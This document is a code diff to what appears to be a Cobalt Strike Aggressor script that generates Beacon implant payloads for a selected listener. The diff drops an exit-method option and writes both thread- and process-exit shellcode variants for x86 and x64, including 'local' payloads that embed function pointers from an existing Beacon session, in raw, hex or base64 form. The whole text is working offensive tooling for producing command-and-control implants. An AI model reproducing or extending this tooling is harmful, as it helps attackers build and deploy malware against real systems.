@@ -33,8 +33,12 @@ sub generate
         write_payload($outpath, %_options["listener"] . "-x64.ps1", artifact_payload(%_options["listener"], "powershell", "x64"));
         write_payload($outpath, %_options["listener"] . "-x86.py", artifact_payload(%_options["listener"], "python", "x86"));
         write_payload($outpath, %_options["listener"] . "-x64.py", artifact_payload(%_options["listener"], "python", "x64"));
-        write_payload($outpath, %_options["listener"] . "-" . %_options["exit_method"] . "-x86.bin", payload(%_options["listener"], "x86", %_options["exit_method"]));
-        write_payload($outpath, %_options["listener"] . "-" . %_options["exit_method"] . "-x64.bin", payload(%_options["listener"], "x64", %_options["exit_method"]));
+
+        write_payload($outpath, %_options["listener"] . "-thread-x86.bin", payload(%_options["listener"], "x86", "thread"));
+        write_payload($outpath, %_options["listener"] . "-thread-x64.bin", payload(%_options["listener"], "x64", "thread"));
+        write_payload($outpath, %_options["listener"] . "-process-x86.bin", payload(%_options["listener"], "x86", "process"));
+        write_payload($outpath, %_options["listener"] . "-process-x64.bin", payload(%_options["listener"], "x64", "process"));
+
         write_payload($outpath, %_options["listener"] . "-svc-x86.exe", artifact_payload(%_options["listener"], "svcexe", "x86"));
         write_payload($outpath, %_options["listener"] . "-svc-x64.exe", artifact_payload(%_options["listener"], "svcexe", "x64"));
 
@@ -90,26 +94,41 @@ sub generate_shellcode
 
         $pay1 = "";
         $pay2 = "";
-        $name = %_options["listener"] . "-" . %_options["exit_method"];
+        $name = %_options["listener"] . "-";
 
         if(%_options["local"] eq "true") {
             if(strlen(%_options["bid"]) == 0) {
                 show_error("You must select existing Beacon session to generate Local payloads with embedded function pointers!");
                 return 0;
             }
-
-            $pay1 = payload_local(%_options["bid"], %_options["listener"], "x86", %_options["exit_method"]);
-            $pay2 = payload_local(%_options["bid"], %_options["listener"], "x64", %_options["exit_method"]);
-
+            
             $name .= "-local";
+
+            $pay1 = payload_local(%_options["bid"], %_options["listener"], "x86", "thread");
+            $pay2 = payload_local(%_options["bid"], %_options["listener"], "x64", "thread");
+
+            write_payload($outpath, $name . "thread-x86.bin", format_shellcode(%_options["format"], $pay1));
+            write_payload($outpath, $name . "thread-x64.bin", format_shellcode(%_options["format"], $pay2));
+
+            $pay1 = payload_local(%_options["bid"], %_options["listener"], "x86", "process");
+            $pay2 = payload_local(%_options["bid"], %_options["listener"], "x64", "process");
+
+            write_payload($outpath, $name . "process-x86.bin", format_shellcode(%_options["format"], $pay1));
+            write_payload($outpath, $name . "process-x64.bin", format_shellcode(%_options["format"], $pay2));
         }
         else {
-            $pay1 = payload(%_options["listener"], "x86", %_options["exit_method"]);
-            $pay2 = payload(%_options["listener"], "x64", %_options["exit_method"]);
-        }
+            $pay1 = payload(%_options["listener"], "x86", "thread");
+            $pay2 = payload(%_options["listener"], "x64", "thread");
 
-        write_payload($outpath, $name . "-x86.bin", format_shellcode(%_options["format"], $pay1));
-        write_payload($outpath, $name . "-x64.bin", format_shellcode(%_options["format"], $pay2));
+            write_payload($outpath, $name . "thread-x86.bin", format_shellcode(%_options["format"], $pay1));
+            write_payload($outpath, $name . "thread-x64.bin", format_shellcode(%_options["format"], $pay2));
+
+            $pay1 = payload(%_options["listener"], "x86", "process");
+            $pay2 = payload(%_options["listener"], "x64", "process");
+
+            write_payload($outpath, $name . "process-x86.bin", format_shellcode(%_options["format"], $pay1));
+            write_payload($outpath, $name . "process-x64.bin", format_shellcode(%_options["format"], $pay2));
+        }
 
         prompt_text("Payload variants generated to:", $outpath, {});
         #add_to_clipboard($outpath);
@@ -126,7 +145,6 @@ popup attacks
         
         dialog_description($dialog, "Generates variants for the selected listener's payloads and dumps them to a specified output directory.");
         drow_listener_stage($dialog, "listener", "Listener: ");
-        drow_combobox($dialog, "exit_method", "Exit Method for shellcodes: ", @("process", "thread"));
         dbutton_action($dialog, "Generate");
 
         dialog_show($dialog);
@@ -142,7 +160,6 @@ popup attacks
         drow_listener_stage($dialog, "listener", "Listener: ");
         drow_checkbox($dialog, "local", "Embed function pointers from existing Beacon session: ", "Local Payload");
         drow_beacon($dialog, "bid", "Existing session to use with Local Payload type: ");
-        drow_combobox($dialog, "exit_method", "Exit Method: ", @("process", "thread"));
         drow_combobox($dialog, "format", "Formatting: ", @("raw","hex","0x90\,0x90,\0x90","\\x90\\x90\\x90","b64"));
         dbutton_action($dialog, "Generate");
 
